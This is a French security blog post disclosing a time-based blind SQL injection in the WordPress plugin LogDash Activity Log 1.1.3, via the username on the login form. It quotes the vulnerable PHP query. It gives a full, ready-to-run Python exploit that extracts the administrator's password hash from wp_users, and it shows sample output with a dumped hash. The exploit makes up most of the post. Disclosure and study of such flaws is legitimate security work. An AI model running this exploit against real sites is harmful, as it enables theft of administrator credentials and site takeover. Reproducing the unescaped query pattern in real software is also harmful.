---
title: "Faille d'injection SQL dans le plugin Wordpress LogDash Activity Log"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [LogDash Activity Log](https://wordpress.org/plugins/logdash-activity-log) (slug: `logdash-activity-log`) se présente de cette façon :

> LogDash Activity Log is the ultimate solution for tracking activities on your WordPress site. With its comprehensive features and intuitive interface, managing your website’s activity log has never been easier.
>
> Designed with simplicity in mind, LogDash Activity Log allows you to effortlessly monitor and track all actions on your WordPress site, including user logins, content changes, plugin updates, and more. Its user-friendly dashboard gives you instant access to critical information, making it easy to identify and resolve issues quickly.
>
> Whether you’re managing a personal blog or a large corporate website, LogDash Activity Log Plugin is the perfect tool for enhancing your site’s security.

La version testée est la 1.1.3 et date d'il y a 3 mois au moment de ces lignes.

## La vulnérabilité

Le script `src/Hooks/Users.php` du plugin définit quelques hooks via la fonction `add_action` :

```php
class Users extends HooksBase {                                                                                        
                                                                                                                       
    private static string $object_type = 'user';                                                                       
    private array $old_meta = [];                                                                                      
                                                                                                                       
    public function init() {                                                                                           
        $this->actions();                                                                                              
    }                                                                                                                  
                                                                                                                       
    public function actions() {                                                                                        
        add_action( 'user_register', [ $this, 'user_register' ], 10, 2 );                                              
        add_action( 'deleted_user', [ $this, 'deleted_user' ], 10, 3 );                                                
        add_action( 'profile_update', [ $this, 'profile_update' ], 10, 3 );                                            
        add_action( 'wp_login', [ $this, 'login' ], 10, 2 );                                                           
        add_action( 'wp_logout', [ $this, 'logout' ] );                                                                
        add_action( 'wp_login_failed', [ $this, 'login_failed' ], 10, 2 );                                             
        add_action( 'update_user_meta', [ $this, 'before_update_user_meta' ], 10, 4 );                                 
        add_action( 'updated_user_meta', [ $this, 'updated_user_meta' ], 10, 4 );                                      
        add_action( 'admin_init', array( $this, 'extra_actions' ) );                                                   
        add_filter( 'logdash_manage_columns-' . self::$object_type . '-content_event_meta', [                          
            $this,                                                                                                     
            'event_meta_info'                                                                                          
        ], 10, 3 );                                                                                                    
    
```

On voit notamment le hook sur `wp_login_failed` qui va appeler `login_failed` de la même classe dans le but de pouvoir loguer une tentative de connexion échouée.

Cette fonction est vulnérable à une faille d'injection SQL :

```php
public function login_failed( $user_login, $error ) {                                                              
                                                                                                                   
    $user              = get_user_by( 'login', $user_login );                                                      
    $errors            = current( array_keys( get_object_vars( $error )['errors'] ) );                             
    $attempt_last_date = (string) time();                                                                          
    $failed_login      = EventTypes::FAILED_LOGIN;                                                                 
                                                                                                                   
    global $wpdb;                                                                                                  
                                                                                                                   
    $log_table = DB::log_table();                                                                                  
    $meta_table = DB::meta_table();                                                                                
                                                                                                                   
    $user_query = "SELECT log.ID FROM {$log_table} AS log                                                          
                    LEFT JOIN {$meta_table} AS meta ON meta.event_id = log.ID                                      
                    WHERE log.event_type = '{$failed_login}'                                                       
                    AND meta.name = 'userLogin'                                                                    
                    AND meta.value = '{$user_login}'                                                               
                    AND FROM_UNIXTIME(created, '%Y-%m-%d') = CURRENT_DATE()                                        
                    ORDER BY log.ID DESC LIMIT 1;";                                                                
                                                                                                                   
    $event_id = $wpdb->get_var( $user_query );
```

La vulnérabilité vient du fait que le nom d'utilisateur (variable `$user_login`) est utilisé tel quel dans la requête SQL (clause `WHERE` pour `meta.value`). 

L'exploitation est possible via une technique time-based.

Pour ce faire, on préférera l'emploi d'un payload de type `(SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)` qui a l'avantage de respecter le délai d'attente défini alors qu'un simple `SLEEP(5)` se serait multiplié en raison de la jointure et aurait vite atteint les limites du serveur SQL.

Exploit qui dump le hash de l'utilisateur ayant l'ID 1 (généralement l'administrateur) depuis la table `wp_users` :

```python
import sys
from time import sleep, monotonic
from binascii import unhexlify

import requests
from requests.exceptions import RequestException

HEX_CHARS = "0123456789ABCDEFG"
SLEEP_TIME = "10"  # Must be an int
TIMEOUT = 10


def compare_char(idx: int, ope: str, value: str):
    return f"select substr(hex(user_pass),{idx},1){ope}'{value}' from wp_users where ID=1"

def sleep_if(cond: str, time: int):
    return f"sleep(if(({cond}),{time},0))"

def select_sleep(statement):
    return f"(select 1 from (select({statement}))YY)"

def find_char_range_at_index(idx: int):
    yield "ABCDEF", sleep_if(compare_char(idx, " < ", "G"), SLEEP_TIME)
    yield "56789", sleep_if(compare_char(idx, " < ", "A"), SLEEP_TIME)
    yield "01234", sleep_if(compare_char(idx, " < ", "5"), SLEEP_TIME)
    yield "", sleep_if(compare_char(idx, " < ", "0"), SLEEP_TIME)

def find_char_at_index(idx: int, char_range: str):
    for c in char_range:
        yield c, sleep_if(compare_char(idx, " = ", c), SLEEP_TIME)


def exploit(url: str):
    sess = requests.session()
    sess.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
    sess.get(url)

    data = {
            "log": "",
            "pwd": "dddd",
            "wp-submit": "Log In",
            "redirect_to": url.replace("wp-login.php", "wp-admin/"),
            "testcookie": "1",
    }

    idx = 1
    hex_hash = ""
    while True:
        possible_chars = ""
        for char_range, statement in find_char_range_at_index(idx):
            sql = "' OR " + select_sleep(statement) + " # a"
            data["log"] = sql
            start = monotonic()

            try:
                sess.post(
                    url,
                    data=data,
                    timeout=TIMEOUT,
                    headers={
                        "Cookie": "wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US",
                        "Pragma": "no-cache",
                        "Cache-Control": "no-cache",
                        "Referer": url,
                        "Upgrade-Insecure-Requests": "1",
                    },
                )
            except RequestException:
                pass

            if monotonic() - start > TIMEOUT:
                possible_chars = char_range

        if not possible_chars:
            # We reached end of string
            break

        for c, statement in find_char_at_index(idx, possible_chars):
            sql = "' OR " + select_sleep(statement) + " # a"
            data["log"] = sql

            start = monotonic()
            try:
                sess.post(
                    url,
                    data=data,
                    timeout=TIMEOUT,
                    headers={
                        "Cookie": "wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US",
                        "Pragma": "no-cache",
                        "Cache-Control": "no-cache",
                        "Referer": url,
                        "Upgrade-Insecure-Requests": "1",
                    },
                )
            except RequestException:
                pass

            if monotonic() - start > TIMEOUT:
                # timeout occurred meaning we found the good char
                hex_hash += c
                sys.stdout.write(c)
                sys.stdout.flush()
                break

        idx += 1

    print('')
    print("hexencoded hash:", hex_hash)
    if len(hex_hash) % 2 == 1:
        print("extraction failed, odd length")
    else:
        print("hash:", unhexlify(hex_hash).decode("utf-8", errors="ignore"))

if __name__ == "__main__":
    print("-*- Blind SQL exploit for Wordpress plugin LogDash Activity Log -*-")
    print("             devloop 2023 - https://devl00p.github.io/")
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} http://target/wp-login.php")
    else:
        exploit(sys.argv[1])
```

Exploitation :

```console
$ python3 exploit.py http://localhost:8000/wp-login.php
-*- Blind SQL exploit for Wordpress plugin LogDash Activity Log -*-
             devloop 2023 - https://devl00p.github.io/
245024425A464A544A787A79504231457A3867426A574F452F2F32646F4C576B3330
hexencoded hash: 245024425A464A544A787A79504231457A3867426A574F452F2F32646F4C576B3330
hash: $P$BZFJTJxzyPB1Ez8gBjWOE//2doLWk30
```
